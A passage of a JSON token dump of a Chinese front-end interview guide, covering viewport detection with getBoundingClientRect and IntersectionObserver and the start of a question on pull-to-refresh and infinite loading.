ype":"list","raw":"- top 大于等于 0\\n- left 大于等于 0\\n- bottom 小于等于视窗高度\\n- right 小于等于视窗宽度","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- top 大于等于 0\\n","task":false,"loose":false,"text":"top 大于等于 0","tokens":[{"type":"text","raw":"top 大于等于 0","text":"top 大于等于 0","tokens":[{"type":"text","raw":"top 大于等于 0","text":"top 大于等于 0","escaped":false}]}]},{"type":"list_item","raw":"- left 大于等于 0\\n","task":false,"loose":false,"text":"left 大于等于 0","tokens":[{"type":"text","raw":"left 大于等于 0","text":"left 大于等于 0","tokens":[{"type":"text","raw":"left 大于等于 0","text":"left 大于等于 0","escaped":false}]}]},{"type":"list_item","raw":"- bottom 小于等于视窗高度\\n","task":false,"loose":false,"text":"bottom 小于等于视窗高度","tokens":[{"type":"text","raw":"bottom 小于等于视窗高度","text":"bottom 小于等于视窗高度","tokens":[{"type":"text","raw":"bottom 小于等于视窗高度","text":"bottom 小于等于视窗高度","escaped":false}]}]},{"type":"list_item","raw":"- right 小于等于视窗宽度","task":false,"loose":false,"text":"right 小于等于视窗宽度","tokens":[{"type":"text","raw":"right 小于等于视窗宽度","text":"right 小于等于视窗宽度","tokens":[{"type":"text","raw":"right 小于等于视窗宽度","text":"right 小于等于视窗宽度","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"实现代码如下：","text":"实现代码如下：","tokens":[{"type":"text","raw":"实现代码如下：","text":"实现代码如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction isInViewPort(element) {\\n  const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n  const viewHeight = window.innerHeight || document.documentElement.clientHeight;\\n  const {\\n    top,\\n    right,\\n    bottom,\\n    left,\\n  } = element.getBoundingClientRect();\\n\\n  return (\\n    top >= 0 &&\\n    left >= 0 &&\\n    right <= viewWidth &&\\n    bottom <= viewHeight\\n  );\\n}\\n```","lang":"js","text":"function isInViewPort(element) {\\n  const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n  const viewHeight = window.innerHeight || document.documentElement.clientHeight;\\n  const {\\n    top,\\n    right,\\n    bottom,\\n    left,\\n  } = element.getBoundingClientRect();\\n\\n  return (\\n    top >= 0 &&\\n    left >= 0 &&\\n    right <= viewWidth &&\\n    bottom <= viewHeight\\n  );\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 3）Intersection Observer\\n\\n","depth":5,"text":"3）Intersection Observer","tokens":[{"type":"text","raw":"3）Intersection Observer","text":"3）Intersection Observer","escaped":false}]},{"type":"paragraph","raw":"`Intersection Observer` 即重叠观察者，从这个命名就可以看出它用于判断两个元素是否重叠，因为不用进行事件的监听，性能方面相比 `getBoundingClientRect` 会好很多","text":"`Intersection Observer` 即重叠观察者，从这个命名就可以看出它用于判断两个元素是否重叠，因为不用进行事件的监听，性能方面相比 `getBoundingClientRect` 会好很多","tokens":[{"type":"codespan","raw":"`Intersection Observer`","text":"Intersection Observer"},{"type":"text","raw":" 即重叠观察者，从这个命名就可以看出它用于判断两个元素是否重叠，因为不用进行事件的监听，性能方面相比 ","text":" 即重叠观察者，从这个命名就可以看出它用于判断两个元素是否重叠，因为不用进行事件的监听，性能方面相比 ","escaped":false},{"type":"codespan","raw":"`getBoundingClientRect`","text":"getBoundingClientRect"},{"type":"text","raw":" 会好很多","text":" 会好很多","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用步骤主要分为两步：创建观察者和传入被观察者","text":"使用步骤主要分为两步：创建观察者和传入被观察者","tokens":[{"type":"text","raw":"使用步骤主要分为两步：创建观察者和传入被观察者","text":"使用步骤主要分为两步：创建观察者和传入被观察者","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"###### 创建观察者\\n\\n","depth":6,"text":"创建观察者","tokens":[{"type":"text","raw":"创建观察者","text":"创建观察者","escaped":false}]},{"type":"code","raw":"```js\\nconst options = {\\n  // 表示重叠面积占被观察者的比例，从 0 - 1 取值，\\n  // 1 表示完全被包含\\n  threshold: 1.0, \\n  root:document.querySelector(\'#scrollArea\') // 必须是目标元素的父级元素\\n};\\n\\nconst callback = (entries, observer) => { ....}\\n\\nconst observer = new IntersectionObserver(callback, options);\\n```","lang":"js","text":"const options = {\\n  // 表示重叠面积占被观察者的比例，从 0 - 1 取值，\\n  // 1 表示完全被包含\\n  threshold: 1.0, \\n  root:document.querySelector(\'#scrollArea\') // 必须是目标元素的父级元素\\n};\\n\\nconst callback = (entries, observer) => { ....}\\n\\nconst observer = new IntersectionObserver(callback, options);"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"通过`new IntersectionObserver`创建了观察者 `observer`，传入的参数 `callback` 在重叠比例超过 `threshold` 时会被执行`","text":"通过`new IntersectionObserver`创建了观察者 `observer`，传入的参数 `callback` 在重叠比例超过 `threshold` 时会被执行`","tokens":[{"type":"text","raw":"通过","text":"通过","escaped":false},{"type":"codespan","raw":"`new IntersectionObserver`","text":"new IntersectionObserver"},{"type":"text","raw":"创建了观察者 ","text":"创建了观察者 ","escaped":false},{"type":"codespan","raw":"`observer`","text":"observer"},{"type":"text","raw":"，传入的参数 ","text":"，传入的参数 ","escaped":false},{"type":"codespan","raw":"`callback`","text":"callback"},{"type":"text","raw":" 在重叠比例超过 ","text":" 在重叠比例超过 ","escaped":false},{"type":"codespan","raw":"`threshold`","text":"threshold"},{"type":"text","raw":" 时会被执行`","text":" 时会被执行`","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"关于`callback`回调函数常用属性如下：","text":"关于`callback`回调函数常用属性如下：","tokens":[{"type":"text","raw":"关于","text":"关于","escaped":false},{"type":"codespan","raw":"`callback`","text":"callback"},{"type":"text","raw":"回调函数常用属性如下：","text":"回调函数常用属性如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// 上段代码中被省略的 callback\\nconst callback = function(entries, observer) { \\n    entries.forEach(entry => {\\n        entry.time;               // 触发的时间\\n        entry.rootBounds;         // 根元素的位置矩形，这种情况下为视窗位置\\n        entry.boundingClientRect; // 被观察者的位置举行\\n        entry.intersectionRect;   // 重叠区域的位置矩形\\n        entry.intersectionRatio;  // 重叠区域占被观察者面积的比例（被观察者不是矩形时也按照矩形计算）\\n        entry.target;             // 被观察者\\n    });\\n};\\n```","lang":"js","text":"// 上段代码中被省略的 callback\\nconst callback = function(entries, observer) { \\n    entries.forEach(entry => {\\n        entry.time;               // 触发的时间\\n        entry.rootBounds;         // 根元素的位置矩形，这种情况下为视窗位置\\n        entry.boundingClientRect; // 被观察者的位置举行\\n        entry.intersectionRect;   // 重叠区域的位置矩形\\n        entry.intersectionRatio;  // 重叠区域占被观察者面积的比例（被观察者不是矩形时也按照矩形计算）\\n        entry.target;             // 被观察者\\n    });\\n};"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"###### 传入被观察者\\n\\n","depth":6,"text":"传入被观察者","tokens":[{"type":"text","raw":"传入被观察者","text":"传入被观察者","escaped":false}]},{"type":"paragraph","raw":"通过 `observer.observe(target)` 这一行代码即可简单的注册被观察者","text":"通过 `observer.observe(target)` 这一行代码即可简单的注册被观察者","tokens":[{"type":"text","raw":"通过 ","text":"通过 ","escaped":false},{"type":"codespan","raw":"`observer.observe(target)`","text":"observer.observe(target)"},{"type":"text","raw":" 这一行代码即可简单的注册被观察者","text":" 这一行代码即可简单的注册被观察者","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst target = document.querySelector(\'.target\');\\nobserver.observe(target);\\n```","lang":"js","text":"const target = document.querySelector(\'.target\');\\nobserver.observe(target);"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 4）案例分析\\n\\n","depth":5,"text":"4）案例分析","tokens":[{"type":"text","raw":"4）案例分析","text":"4）案例分析","escaped":false}]},{"type":"paragraph","raw":"实现：创建了一个十万个节点的长列表，当节点滚入到视窗中时，背景就会从红色变为黄色","text":"实现：创建了一个十万个节点的长列表，当节点滚入到视窗中时，背景就会从红色变为黄色","tokens":[{"type":"text","raw":"实现：创建了一个十万个节点的长列表，当节点滚入到视窗中时，背景就会从红色变为黄色","text":"实现：创建了一个十万个节点的长列表，当节点滚入到视窗中时，背景就会从红色变为黄色","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"`Html`结构如下：","text":"`Html`结构如下：","tokens":[{"type":"codespan","raw":"`Html`","text":"Html"},{"type":"text","raw":"结构如下：","text":"结构如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n<div class=\\"container\\"></div>\\n```","lang":"js","text":"<div class=\\"container\\"></div>"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"`css`样式如下：","text":"`css`样式如下：","tokens":[{"type":"codespan","raw":"`css`","text":"css"},{"type":"text","raw":"样式如下：","text":"样式如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n.container {\\n    display: flex;\\n    flex-wrap: wrap;\\n}\\n.target {\\n    margin: 5px;\\n    width: 20px;\\n    height: 20px;\\n    background: red;\\n}\\n```","lang":"css","text":".container {\\n    display: flex;\\n    flex-wrap: wrap;\\n}\\n.target {\\n    margin: 5px;\\n    width: 20px;\\n    height: 20px;\\n    background: red;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"往`container`插入1000个元素","text":"往`container`插入1000个元素","tokens":[{"type":"text","raw":"往","text":"往","escaped":false},{"type":"codespan","raw":"`container`","text":"container"},{"type":"text","raw":"插入1000个元素","text":"插入1000个元素","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst $container = $(\\".container\\");\\n\\n// 插入 100000 个 <div class=\\"target\\"></div>\\nfunction createTargets() {\\n  const htmlString = new Array(100000)\\n    .fill(\'<div class=\\"target\\"></div>\')\\n    .join(\\"\\");\\n  $container.html(htmlString);\\n}\\n```","lang":"js","text":"const $container = $(\\".container\\");\\n\\n// 插入 100000 个 <div class=\\"target\\"></div>\\nfunction createTargets() {\\n  const htmlString = new Array(100000)\\n    .fill(\'<div class=\\"target\\"></div>\')\\n    .join(\\"\\");\\n  $container.html(htmlString);\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"这里，首先使用 `getBoundingClientRect` 方法进行判断元素是否在可视区域","text":"这里，首先使用 `getBoundingClientRect` 方法进行判断元素是否在可视区域","tokens":[{"type":"text","raw":"这里，首先使用 ","text":"这里，首先使用 ","escaped":false},{"type":"codespan","raw":"`getBoundingClientRect`","text":"getBoundingClientRect"},{"type":"text","raw":" 方法进行判断元素是否在可视区域","text":" 方法进行判断元素是否在可视区域","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction isInViewPort(element) {\\n    const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n    const viewHeight =\\n          window.innerHeight || document.documentElement.clientHeight;\\n    const { top, right, bottom, left } = element.getBoundingClientRect();\\n\\n    return top >= 0 && left >= 0 && right <= viewWidth && bottom <= viewHeight;\\n}\\n```","lang":"js","text":"function isInViewPort(element) {\\n    const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n    const viewHeight =\\n          window.innerHeight || document.documentElement.clientHeight;\\n    const { top, right, bottom, left } = element.getBoundingClientRect();\\n\\n    return top >= 0 && left >= 0 && right <= viewWidth && bottom <= viewHeight;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"然后开始监听`scroll`事件，判断页面上哪些元素在可视区域中，如果在可视区域中则将背景颜色设置为`yellow`","text":"然后开始监听`scroll`事件，判断页面上哪些元素在可视区域中，如果在可视区域中则将背景颜色设置为`yellow`","tokens":[{"type":"text","raw":"然后开始监听","text":"然后开始监听","escaped":false},{"type":"codespan","raw":"`scroll`","text":"scroll"},{"type":"text","raw":"事件，判断页面上哪些元素在可视区域中，如果在可视区域中则将背景颜色设置为","text":"事件，判断页面上哪些元素在可视区域中，如果在可视区域中则将背景颜色设置为","escaped":false},{"type":"codespan","raw":"`yellow`","text":"yellow"}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n$(window).on(\\"scroll\\", () => {\\n    console.log(\\"scroll !\\");\\n    $targets.each((index, element) => {\\n        if (isInViewPort(element)) {\\n            $(element).css(\\"background-color\\", \\"yellow\\");\\n        }\\n    });\\n});\\n```","lang":"js","text":"$(window).on(\\"scroll\\", () => {\\n    console.log(\\"scroll !\\");\\n    $targets.each((index, element) => {\\n        if (isInViewPort(element)) {\\n            $(element).css(\\"background-color\\", \\"yellow\\");\\n        }\\n    });\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"通过上述方式，可以看到可视区域颜色会变成黄色了，但是可以明显看到有卡顿的现象，原因在于我们绑定了`scroll`事件，`scroll`事件伴随了大量的计算，会造成资源方面的浪费","text":"通过上述方式，可以看到可视区域颜色会变成黄色了，但是可以明显看到有卡顿的现象，原因在于我们绑定了`scroll`事件，`scroll`事件伴随了大量的计算，会造成资源方面的浪费","tokens":[{"type":"text","raw":"通过上述方式，可以看到可视区域颜色会变成黄色了，但是可以明显看到有卡顿的现象，原因在于我们绑定了","text":"通过上述方式，可以看到可视区域颜色会变成黄色了，但是可以明显看到有卡顿的现象，原因在于我们绑定了","escaped":false},{"type":"codespan","raw":"`scroll`","text":"scroll"},{"type":"text","raw":"事件，","text":"事件，","escaped":false},{"type":"codespan","raw":"`scroll`","text":"scroll"},{"type":"text","raw":"事件伴随了大量的计算，会造成资源方面的浪费","text":"事件伴随了大量的计算，会造成资源方面的浪费","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"下面通过`Intersection Observer`的形式同样实现相同的功能","text":"下面通过`Intersection Observer`的形式同样实现相同的功能","tokens":[{"type":"text","raw":"下面通过","text":"下面通过","escaped":false},{"type":"codespan","raw":"`Intersection Observer`","text":"Intersection Observer"},{"type":"text","raw":"的形式同样实现相同的功能","text":"的形式同样实现相同的功能","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"首先创建一个观察者","text":"首先创建一个观察者","tokens":[{"type":"text","raw":"首先创建一个观察者","text":"首先创建一个观察者","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst observer = new IntersectionObserver(getYellow, { threshold: 1.0 });\\n```","lang":"js","text":"const observer = new IntersectionObserver(getYellow, { threshold: 1.0 });"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"`getYellow`回调函数实现对背景颜色改变，如下：","text":"`getYellow`回调函数实现对背景颜色改变，如下：","tokens":[{"type":"codespan","raw":"`getYellow`","text":"getYellow"},{"type":"text","raw":"回调函数实现对背景颜色改变，如下：","text":"回调函数实现对背景颜色改变，如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction getYellow(entries, observer) {\\n    entries.forEach(entry => {\\n        $(entry.target).css(\\"background-color\\", \\"yellow\\");\\n    });\\n}\\n```","lang":"js","text":"function getYellow(entries, observer) {\\n    entries.forEach(entry => {\\n        $(entry.target).css(\\"background-color\\", \\"yellow\\");\\n    });\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"最后传入观察者，即`.target`元素","text":"最后传入观察者，即`.target`元素","tokens":[{"type":"text","raw":"最后传入观察者，即","text":"最后传入观察者，即","escaped":false},{"type":"codespan","raw":"`.target`","text":".target"},{"type":"text","raw":"元素","text":"元素","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n$targets.each((index, element) => {\\n    observer.observe(element);\\n});\\n```","lang":"js","text":"$targets.each((index, element) => {\\n    observer.observe(element);\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"可以看到功能同样完成，并且页面不会出现卡顿的情况","text":"可以看到功能同样完成，并且页面不会出现卡顿的情况","tokens":[{"type":"text","raw":"可以看到功能同样完成，并且页面不会出现卡顿的情况","text":"可以看到功能同样完成，并且页面不会出现卡顿的情况","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 25. 如何实现一个上拉加载，下拉刷新？\\n\\n","depth":2,"text":"25. 如何实现一个上拉加载，下拉刷新？","tokens":[{"type":"text","raw":"25. 如何实现一个上拉加载，下拉刷新？","text":"25. 如何实现一个上拉加载，下拉刷新？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 上拉加载","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 上拉加载","task":false,"loose":false,"text":"**2：** 上拉加载","tokens":[{"type":"text","raw":"**2：** 上拉加载","text":"**2：** 上拉加载","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 上拉加载","text":" 上拉加载","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"首先可以看一张图","text":"首先可以看一张图","tokens":[{"type":"text","raw":"首先可以看一张图","text":"首先可以看一张图","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241230002614.png)","text":"![](/public/images/3_JavaScript_20241230002614.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241230002614.png)","href":"/public/images/3_JavaScript_20241230002614.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"上拉加载的本质是页面触底，或者快要触底时的动作","text":"上拉加载的本质是页面触底，或者快要触底时的动作","tokens":[{"type":"text","raw":"上拉加载的本质是页面触底，或者快要触底时的动作","text":"上拉加载的本质是页面触底，或者快要触底时的动作","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"判断页面触底我们需要先了解一下下面几个属性","text":"判断页面触底我们需要先了解一下下面几个属性","tokens":[{"type":"text","raw":"判断页面触底我们需要先了解一下下面几个属性","text":"判断页面触底我们需要先了解一下下面几个属性","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- `scrollTop`：滚动视窗的高度距离`window`顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值\\n\\n- `clientHeight`:它是一个定值，表示屏幕可视区域的高度；\\n- `scrollHeight`：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示`body`所有元素的总长度(包括body元素自身的padding)","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- `scrollTop`：滚动视窗的高度距离`window`顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值\\n\\n","task":false,"loose":true,"text":"`scrollTop`：滚动视窗的高度距离`window`顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值\\n","tokens":[{"type":"text","raw":"`scrollTop`：滚动视窗的高度距离`window`顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值\\n","text":"`scrollTop`：滚动视窗的高度距离`window`顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值","tokens":[{"type":"codespan","raw":"`scrollTop`","text":"scrollTop"},{"type":"text","raw":"：滚动视窗的高度距离","text":"：滚动视窗的高度距离","escaped":false},{"type":"codespan","raw":"`window`","text":"window"},{"type":"text","raw":"顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值","text":"顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值","escaped":false}]}]},{"type":"list_item","raw":"- `clientHeight`:它是一个定值，表示屏幕可视区域的高度；\\n","task":false,"loose":true,"text":"`clientHeight`:它是一个定值，表示屏幕可视区域的高度；","tokens":[{"type":"text","raw":"`clientHeight`:它是一个定值，表示屏幕可视区域的高度；","text":"`clientHeight`:它是一个定值，表示屏幕可视区域的高度；","tokens":[{"type":"codespan","raw":"`clientHeight`","text":"clientHeight"},{"type":"text","raw":":它是一个定值，表示屏幕可视区域的高度；","text":":它是一个定值，表示屏幕可视区域的高度；","escaped":false}]}]},{"type":"list_item","raw":"- `scrollHeight`：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示`body`所有元素的总长度(包括body元素自身的padding)","task":false,"loose":true,"text":"`scrollHeight`：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示`body`所有元素的总长度(包括body元素自身的padding)","tokens":[{"type":"text","raw":"`scrollHeight`：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示`body`所有元素的总长度(包括body元素自身的padding)","text":"`scrollHeight`：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示`body`所有元素的总长度(包括body元素自身的padding)","tokens":[{"type":"codespan","raw":"`scrollHeight`","text":"scrollHeight"},{"type":"text","raw":"：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示","text":"：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示","escaped":false},{"type":"codespan","raw":"`body`","text":"body"},{"type":"text","raw":"所有元素的总长度(包括body元素自身的padding)","text":"所有元素的总长度(包括body元素自身的padding)","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"综上我们得出一个触底公式：","text":"综上我们得出一个触底公式：","tokens":[{"type":"text","raw":"综上我们得出一个触底公式：","text":"综上我们得出一个触底公式：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nscrollTop + clientHeight >= scrollHeight\\n```","lang":"js","text":"scrollTop + clientHeight >= scrollHeight"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"简单实现","text":"简单实现","tokens":[{"type":"text","raw":"简单实现","text":"简单实现","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nlet clientHeight  = document.documentElement.clientHeight; //浏览器高度\\nlet scrollHeight = document.body.scrollHeight;\\nlet scrollTop = document.documentElement.scrollTop;\\n \\nlet distance = 50;  //距离视窗还用50的时候，开始触发；\\n\\nif ((scrollTop + clientHeight) >= (scrollHeight - distance)) {\\n    console.log(\\"开始加载数据\\");\\n}\\n```","lang":"js","text":"let clientHeight  = document.documentElement.clientHeight; //浏览器高度\\nlet scrollHeight = document.body.scrollHeight;\\nlet scrollTop = document.documentElement.scrollTop;\\n \\nlet distance = 50;  //距离视窗还用50的时候，开始触发；\\n\\nif ((scrollTop + clientHeight) >= (scrollHeight - distance)) {\\n    console.log(\\"开始加载数据\\");\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 下拉刷新","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 下拉刷新","task":false,"loose":false,"text":"**2：** 下拉刷新","tokens":[{"type":"text","raw":"**2：** 下拉刷新","text":"**2：** 下拉刷新","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 下拉刷新","text":" 下拉刷新","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"下拉刷新的本质是页面本身置于顶部时，用户下拉时需要触发的动作","text":"下拉刷新的本质是页面本身置于顶部时，用户下拉时需要触发的动作","tokens":[{"type":"text","raw":"下拉刷新的本质是页面本身置于顶部时，用户下拉时需要触发的动作","text":"下拉刷新的本质是页面本身置于顶部时，用户下拉时需要触发的动作","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"关于下拉刷新的原生实现，主要分成三步：","text":"关于下拉刷新的原生实现，主要分成三步：","tokens":[{"type":"text","raw":"关于下拉刷新的原生实现，主要分成三步：","text":"关于下拉刷新的原生实现，主要分成三步：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 监听原生`touchstart`事件，记录其初始位置的值，`e.touches[0].pageY`；\\n- 监听原生`touchmove`事件，记录并计算当前滑动的位置值与初始位置值的差值，大于`0`表示向下拉动，并借助CSS3的`translateY`属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；\\n- 监听原生`touchend`事件，若此时元素滑动达到最大值，则触发`callback`，同时将`translateY`重设为`0`，元素回到初始位置","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 监听原生`touchstart`事件，记录其初始位置的值，`e.touches[0].pageY`；\\n","task":false,"loose":false,"text":"监听原生`touchstart`事件，记录其初始位置的值，`e.touches[0].pageY`；","tokens":[{"type":"text","raw":"监听原生`touchstart`事件，记录其初始位置的值，`e.touches[0].pageY`；","text":"监听原生`touchstart`事件，记录其初始位置的值，`e.touches[0].pageY`；","tokens":[{"type":"text","raw":"监听原生","text":"监听原生","escaped":false},{"type":"codespan","raw":"`touchstart`","text":"touchstart"},{"type":"text","raw":"事件，记录其初始位置的值，","text":"事件，记录其初始位置的值，","escaped":false},{"type":"codespan","raw":"`e.touches[0].pageY`","text":"e.touches[0].pageY"},{"type":"text","raw":"；","text":"；","escaped":false}]}]},{"type":"list_item","raw":"- 监听原生`touchmove`事件，记录并计算当前滑动的位置值与初始位置值的差值，大于`0`表示向下拉动，并借助CSS3的`translateY`属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；\\n","task":false,"loose":false,"text":"监听原生`touchmove`事件，记录并计算当前滑动的位置值与初始位置值的差值，大于`0`表示向下拉动，并借助CSS3的`translateY`属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；","tokens":[{"type":"text","raw":"监听原生`touchmove`事件，记录并计算当前滑动的位置值与初始位置值的差值，大于`0`表示向下拉动，并借助CSS3的`translateY`属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；","text":"监听原生`touchmove`事件，记录并计算当前滑动的位置值与初始位置值的差值，大于`0`表示向下拉动，并借助CSS3的`translateY`属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；","tokens":[{"type":"text","raw":"监听原生","text":"监听原生","escaped":false},{"type":"codespan","raw":"`touchmove`","text":"touchmove"},{"type":"text","raw":"事件，记录并计算当前滑动的位置值与初始位置值的差值，大于","text":"事件，记录并计算当前滑动的位置值与初始位置值的差值，大于","escaped":false},{"type":"codespan","raw":"`0`","text":"0"},{"type":"text","raw":"表示向下拉动，并借助CSS3的","text":"表示向下拉动，并借助CSS3的","escaped":false},{"type":"codespan","raw":"`translateY`","text":"translateY"},{"type":"text","raw":"属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；","text":"属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；","escaped":false}]}]},{"type":"list_item","raw":"- 监听原生`touchend`事件，若此时元素滑动达到最大值，则触发`callback`，同时将`translateY`重设为`0`，元素回到初始位置","task":false,"loose":false,"text":"监听原生`touchend`事件，若此时元素滑动达到最大值，则触发`callback`，同时将`translateY`重设为`0`，元素回到初始位置","tokens":[{"type":"text","raw":"监听原生`touchend`事件，若此时元素滑动达到最大值，则触发`callback`，同时将`translateY`重设为`0`，元素回到初始位置","text":"监听原生`touchend`事件，若此时元素滑动达到最大值，则触发`callback`，同时将`translateY`重设为`0`，元素回到初始位置","tokens":[{"type":"text","raw":"监听原生","text":"监听原生","escaped":false},{"type":"codespan","raw":"`touchend`","text":"touchend"},{"type":"text","raw":"事件，若此时元素滑动达到最大值，则触发","text":"事件，若此时元素滑动达到最大值，则触发","escaped":false},{"type":"codespan","raw":"`callback`","text":"callback"},{"type":"text","raw":"，同时将","text":"，同时将","escaped":false},{"type":"codespan","raw":"`translateY`","text":"translateY"},{"type":"text","raw":"重设为","text":"重设为","escaped":false},{"type":"codespan","raw":"`0`","text":"0"},{"type":"text","raw":"，元素回到初始位置","text":"，元素回到初始位置","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"举个例子：","text":"举个例子：","tokens":[{"type":"text","raw":"举个例子：","text":"举个例子：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"`Html`结构如下：","text":"`Html`结构如下：","tokens":[{"type":"codespan","raw":"`Html`","text":"Html"},{"type":"text","raw":"结构如下：","text":"结构如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n<main>\\n    <p class=\\"refreshText\\"></p >\\n    